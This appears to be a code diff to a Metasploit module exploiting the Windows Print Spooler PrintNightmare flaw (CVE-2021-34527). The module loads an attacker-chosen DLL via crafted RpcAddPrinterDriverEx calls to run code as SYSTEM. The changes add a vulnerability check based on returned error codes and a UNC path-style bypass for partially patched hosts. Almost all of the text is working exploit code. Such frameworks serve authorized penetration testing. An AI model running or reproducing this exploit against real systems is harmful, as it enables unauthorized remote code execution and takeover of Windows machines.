@@ -240,7 +240,8 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'Print Spooler Remote DLL Injection',
         'Description' => %q{
           The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted
-          DCERPC request, resulting in remote code execution as NT AUTHORITY\SYSTEM.
+          DCERPC request, resulting in remote code execution as NT AUTHORITY\SYSTEM. This modules uses the MS-RPRN
+          vector which requires the Print Spooler service to be running.
         },
         'Author' => [
           'Zhiniang Peng',           # vulnerability discovery / research
@@ -258,7 +259,8 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2021-34527'],
           ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
           ['URL', 'https://github.com/afwu/PrintNightmare'],
-          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1']
+          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1'],
+          ['URL', 'https://github.com/byt3bl33d3r/ItWasAllADream']
         ],
         'Notes' => {
           'AKA' => [ 'PrintNightmare' ],
@@ -282,6 +284,7 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('ReconnectDelay', [ true, 'A delay in seconds to wait before reconnecting to the named pipe', 10 ])
       ]
     )
+    deregister_options('AutoCheck')
   end
 
   def check
@@ -308,35 +311,71 @@ class MetasploitModule < Msf::Auxiliary
     end
     vprint_status("Bound to #{handle} ...")
 
+    arch = dcerpc_getarch
+    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
+    if arch == ARCH_X64
+      @environment = 'Windows x64'
+    elsif arch == ARCH_X86
+      @environment = 'Windows NT x86'
+    else
+      return Exploit::CheckCode::Detected('Successfully bound to the remote service.')
+    end
+
+    print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")
+
+    print_status('Enumerating the installed printer drivers...')
+    drivers = enum_printer_drivers(@environment)
+    @driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
+    vprint_status("Using driver path: #{@driver_path}")
+
+    print_status('Retrieving the path of the printer driver directory...')
+    @config_directory = get_printer_driver_directory(@environment)
+    vprint_status("Using driver directory: #{@config_directory}") unless @config_directory.nil?
+
+    container = driver_container(
+      p_config_file: 'C:\\Windows\\System32\\kernel32.dll',
+      p_data_file: "\\??\\UNC\\127.0.0.1\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.dll"
+    )
+
+    case add_printer_driver_ex(container)
+    when ::WindowsError::Win32::ERROR_PATH_NOT_FOUND
+      return Exploit::CheckCode::Vulnerable('Received ERROR_PATH_NOT_FOUND, implying the target is vulnerable.')
+    when ::WindowsError::Win32::ERROR_BAD_NET_NAME
+      return Exploit::CheckCode::Vulnerable('Received ERROR_BAD_NET_NAME, implying the target is vulnerable.')
+    when ::WindowsError::Win32::ERROR_ACCESS_DENIED
+      return Exploit::CheckCode::Safe('Received ERROR_ACCESS_DENIED implying the target is patched.')
+    end
+
     Exploit::CheckCode::Detected('Successfully bound to the remote service.')
   end
 
   def run
-    arch = dcerpc_getarch
-    fail_with(Failure::UnexpectedReply, 'Failed to identify the target architecture.') if arch.nil?
+    fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported.') if @environment.nil?
+    fail_with(Failure::Unknown, 'Failed to enumerate the driver directory.') if @config_directory.nil?
 
-    print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")
+    dll_path = datastore['DLL_PATH'].strip
+    if dll_path =~ /^\\\\([\w:.\[\]]+)\\(.*)$/
+      # targets patched for CVE-2021-34527 (but with Point and Print enabled) need to use this path style as a bypass
+      # otherwise the operation will fail with ERROR_INVALID_PARAMETER
+      dll_path = "\\??\\UNC\\#{Regexp.last_match(1)}\\#{Regexp.last_match(2)}"
+    end
+    vprint_status("Using DLL path: #{dll_path}")
 
-    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
-    if arch == ARCH_X64
-      environment = 'Windows x64'
-    elsif arch == ARCH_X86
-      environment = 'Windows NT x86'
-    else
-      fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported.')
+    filename = dll_path.rpartition('\\').last
+    container = driver_container(p_config_file: 'C:\\Windows\\System32\\kernel32.dll', p_data_file: dll_path)
+
+    3.times do
+      add_printer_driver_ex(container)
     end
 
-    print_status('Enumerating the installed printer drivers...')
-    drivers = enum_printer_drivers(environment)
-    driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
-    vprint_status("Using driver path: #{driver_path}")
+    1.upto(3) do |directory|
+      container.driver_info.p_config_file.assign("#{@config_directory}\\3\\old\\#{directory}\\#{filename}")
+      add_printer_driver_ex(container)
+    end
+  end
 
-    print_status('Retrieving the path of the printer driver directory...')
-    config_directory = get_printer_driver_directory(environment)
-    vprint_status("Using driver directory: #{config_directory}")
-
-    filename = datastore['DLL_PATH'].rpartition('\\').last
-    container = PrintSystem::DriverContainer.new(
+  def driver_container(**kwargs)
+    PrintSystem::DriverContainer.new(
       level: 2,
       tag: 2,
       driver_info: PrintSystem::DriverInfo2.new(
@@ -348,23 +387,11 @@ class MetasploitModule < Msf::Auxiliary
         p_config_file_ref_id: 0x00020010,
         # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
         p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
-        p_environment: environment,
-        p_driver_path: driver_path,
-        p_data_file: datastore['DLL_PATH']
+        p_environment: @environment,
+        p_driver_path: @driver_path,
+        **kwargs
       )
     )
-
-    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
-
-    3.times do
-      container.driver_info.p_config_file.assign('C:\\Windows\\System32\\kernel32.dll')
-      add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
-    end
-
-    1.upto(3) do |directory|
-      container.driver_info.p_config_file.assign("#{config_directory}\\3\\old\\#{directory}\\#{filename}")
-      add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
-    end
   end
 
   def dcerpc_bind_spoolss
@@ -388,11 +415,12 @@ class MetasploitModule < Msf::Auxiliary
     RubySMB::Field::Stringz16.read(response.p_driver_directory.referent.value.map(&:chr).join).encode('ASCII-8BIT')
   end
 
-  def add_printer_driver_ex(name, container, flags)
+  def add_printer_driver_ex(container)
     reconnect = true
+    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
 
     begin
-      response = rprn_call('RpcAddPrinterDriverEx', p_name: name, p_driver_container: container, dw_file_copy_flags: flags)
+      response = rprn_call('RpcAddPrinterDriverEx', p_name: "\\\\#{datastore['RHOST']}", p_driver_container: container, dw_file_copy_flags: flags)
     rescue RubySMB::Error::UnexpectedStatusCode => e
       nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
       message = "Error #{nt_status.name} (#{nt_status.description})"
@@ -414,18 +442,14 @@ class MetasploitModule < Msf::Auxiliary
         print_error(message)
       end
 
-      return
+      return nt_status
     end
 
+    error = ::WindowsError::Win32.find_by_retval(response.error_status.value).first
     message = "RpcAddPrinterDriverEx response #{response.error_status}"
-    errors = ::WindowsError::Win32.find_by_retval(response.error_status.value)
-    unless errors.empty?
-      error = errors.first
-      message << " #{error.name} (#{error.description})"
-    end
+    message << " #{error.name} (#{error.description})" unless error.nil?
     vprint_status(message)
-
-    response
+    error
   end
 
   def rprn_call(name, **kwargs)
